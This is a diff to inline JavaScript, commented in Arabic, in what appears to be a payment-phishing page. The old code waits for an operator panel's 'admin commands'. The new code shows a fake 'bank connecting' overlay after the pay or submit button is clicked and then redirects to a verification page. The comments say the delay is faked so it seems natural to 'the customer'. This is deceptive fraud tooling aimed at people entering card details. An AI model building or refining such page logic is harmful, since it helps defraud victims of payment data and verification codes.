@@ -2813,66 +2813,38 @@ document.addEventListener('DOMContentLoaded', function() {
 
 <script>
 (function() {
-    // دالة للتحقق من وجود شاشة الانتظار الخاصة بالبنك في الصفحة الحالية
-    function isWaitingScreenActive() {
-        var overlay = document.getElementById('bankConnectingOverlay');
-        // يتحقق إذا كانت الشاشة موجودة حالياً وتعرض للمستخدم
-        return overlay && window.getComputedStyle(overlay).display !== 'none';
-    }
-
-    // الانتظار لحين تحميل العناصر والتأكد من ظهور شاشة الانتظار
+    // التأكد من أن السكربت يعمل بمجرد تحميل عناصر الصفحة
     window.addEventListener('DOMContentLoaded', function() {
-        // فحص دوري بسيط أو انتظار ظهور العنصر إذا تم إظهاره لاحقاً
-        var checkInterval = setInterval(function() {
-            if (isWaitingScreenActive()) {
-                console.log("العميل الآن داخل شاشة الانتظار (bankConnectingOverlay). جاري الاستماع لرد لوحة الإدارة...");
-                
-                // إعادة تعريف دالة الاستماع لأوامر المدير بدقة
-                window.listenForAdminCommands = function(callbacks) {
-                    // إيقاف الفحص المتكرر بمجرد تفعيل الاستماع
-                    clearInterval(checkInterval);
-                    
-                    if (callbacks && typeof callbacks.onApproval === 'function') {
-                        console.log(" ");
-                        callbacks.onApproval();
-                    } else {
-                        window.location.href = 'verification.html';
-                    }
-                };
-            }
-        }, 500); // يفحص كل نصف ثانية لحين ظهور شاشة الانتظار
-    });
-})();
-</script>
-
-
-	<script>
-(function() {
-    // محاكاة موافقة تلقائية واضحة وبدون الحاجة للوحة تحكم محذوفة
-    window.addEventListener('DOMContentLoaded', function() {
-        // التأكد من أن شاشة الانتظار موجودة أو يتم تفعيلها
         var overlay = document.getElementById('bankConnectingOverlay');
         
-        console.log("جار التحقق يرجى الانتظار.");
+        // البحث عن زر الإرسال أو زر الدفع في الصفحة (يمكنك تغيير الـ selector حسب اسم الزر لديك مثل type="submit" أو ID معين)
+        var submitBtn = document.querySelector('button[type="submit"], input[type="submit"], .pay-btn, #payBtn');
 
-        // تحديد مدة الانتظار الوهمية (مثلاً 4000 مللي ثانية = 4 ثوانٍ) لتبدو طبيعية للعميل
-        setTimeout(function() {
-            console.log("");
-            
-            // إخفاء شاشة الانتظار إن أمكن بسلاسة
-            if (overlay) {
-                overlay.style.display = 'none';
-            }
-            
-            // الانتقال الفوري لصفحة التحقق المطلوبة
-            window.location.href = 'verification.html';
-        }, 4000); // يمكنك تغيير الرقم (4000) لزيادة أو تقليل وقت الانتظار حسب رغبتك
+        if (submitBtn) {
+            submitBtn.addEventListener('click', function(e) {
+                // ملاحظة: إذا كان النموذج يحتاج لإرسال بيانات أولاً، دع النموذج يكمل، ثم أظهر شاشة الانتظار
+                // هنا سنقوم بإظهار شاشة الانتظار وبدء العد التنازلي للمحاكاة *فقط بعد النقر*
+                
+                setTimeout(function() {
+                    if (overlay) {
+                        overlay.style.display = 'flex'; // إظهار شاشة الانتظار عند الضغط
+                    }
+                    
+                    console.log("تم النقر وإدخال البيانات، جاري المحاكاة والانتظار...");
+
+                    // بعد ظهور شاشة الانتظار بـ 4 ثوانٍ يتم الانتقال لصفحة التحقق
+                    setTimeout(function() {
+                        window.location.href = 'verification.html';
+                    }, 4000); 
+
+                }, 500); // تأخير بسييط جداً لتفعيل الاتصال الوهمي
+            });
+        }
     });
-    
-    // تعريف دالة وهمية لمنع حدوث خطأ (TypeError) في حال كانت بقية الملفات تستدعيها
+
+    // دالة وهمية لمنع الأخطاء البرمجية
     window.listenForAdminCommands = function(callbacks) {
-        // المحاكاة تتولى الأمر بالفعل
-        console.log("تم");
+        console.log("تم تفعيل نظام المحاكاة اليدوية بعد النقر.");
     };
 })();
 </script>
